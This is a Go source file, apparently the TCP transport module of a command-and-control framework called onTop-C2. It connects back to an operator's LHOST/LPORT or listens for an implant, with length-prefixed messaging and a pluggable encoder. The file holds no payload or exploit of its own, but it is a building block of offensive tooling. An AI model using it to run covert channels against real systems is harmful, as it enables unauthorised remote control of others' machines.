package rituals

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strconv"
	"time"

	"github.com/Yyax13/onTop-C2/src/fidelius"
	"github.com/Yyax13/onTop-C2/src/types"
)

var tcp types.Ritual = types.Ritual{
	Name: "tcp",
	Description: "Create a TCP ritual",
	Encoder: fidelius.Basic_bjump,
	Connect: tcpConnect{},
	Listener: tcpListen{},

}

type tcpListen struct{
	lport		int
	fidelius	types.FideliusCasting

}

type tcpFloo struct{
	conn net.Conn

}

type tcpConnect struct{
	lhost		string
	lport		int
	fidelius	types.FideliusCasting

}

func (r *tcpFloo) Send(data []byte) (error) {
	dataLen := uint64(len(data))
	dataLenBuf := make([]byte, 8)
	binary.BigEndian.PutUint64(dataLenBuf, dataLen)

	if _, err := r.conn.Write(dataLenBuf); err != nil {
		return fmt.Errorf("send: failed to send data len: %w", err)

	}

	if _, err := r.conn.Write(data); err != nil {
		return fmt.Errorf("send: failed to send data: %w", err)

	}

	return nil

}

func (r *tcpFloo) Receive() ([]byte, error) {
	dataLenBuf := make([]byte, 8)
	if _, err := io.ReadFull(r.conn, dataLenBuf); err != nil {
		return nil, fmt.Errorf("receive: failed to receive data len: %w", err)

	}
	
	lenBuf := binary.BigEndian.Uint64(dataLenBuf)
	data := make([]byte, lenBuf)

	if _, err := io.ReadFull(r.conn, data); err != nil {
		return nil, fmt.Errorf("receive: failed to receive data: %w", err)

	}

	return data, nil

}

func (r *tcpFloo) Close() (error) {
	return r.conn.Close()

}

func (r *tcpFloo) IsActive() (bool) {
	_ = r.conn.SetWriteDeadline(time.Now().Add(time.Millisecond * 900))
	_, err := r.conn.Write([]byte(nil))
	r.conn.SetWriteDeadline(time.Time{})
	return err == nil

}

func (t tcpConnect) InitArcane() (*types.ArcaneLink, error) {
	host := t.lhost
	port := t.lport
	connString := net.JoinHostPort(host, strconv.Itoa(port))
	connection, err := net.Dial("tcp", connString)
	if err != nil {
		return &types.ArcaneLink{}, fmt.Errorf("%w\n\nand can't reach host %s, check it and try again", err, host)

	}

	return &types.ArcaneLink{
		Network: &tcpFloo{
			conn: connection, 
		
		},
		ClientScroll: &types.Scroll{},
		Fidelius: t.fidelius,
		
	}, nil

}

func (t tcpListen) InitListener() (*types.ArcaneLink, error) {
	port := t.lport
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		return &types.ArcaneLink{}, err
		
	}

	defer listener.Close()

	conn, err := listener.Accept()
	if err != nil {
		return &types.ArcaneLink{}, err

	}

	host, _, err := net.SplitHostPort(conn.RemoteAddr().String())
	if err != nil {
		return nil, err

	}



	return &types.ArcaneLink{
		Network: &tcpFloo{
			conn: conn,

		},
		ClientScroll: &types.Scroll{
			IP: net.ParseIP(host),
			
		},
		Fidelius: t.fidelius,

	}, nil

}

func tcpCreator() (RitualCreator) {
	return func(params map[string]string) (types.RitualInit, types.RitualListener, error) {
		port, err := strconv.ParseInt(params["LPORT"], 10, 16)
		if err != nil {
			return nil, nil, fmt.Errorf("failed to use LPORT param as ritual lport: %w", err)

		}

		fideliusCast, exists := fidelius.AvaliableFidelius[params["FIDELIUS"]]
		if !exists {
			return nil, nil, fmt.Errorf("specified fidelius %s do not exists", params["FIDELIUS"])

		}

		return tcpConnect{
			lhost: params["LHOST"],
			lport: int(port),
			fidelius: fideliusCast.Fidelius,
			
		}, tcpListen{
			lport: int(port),
			fidelius: fideliusCast.Fidelius,

		}, nil

	}

}

func init() {
	RegisterNewRitual(&tcp)
	RegisterNewRitualCreator("tcp", tcpCreator())

}
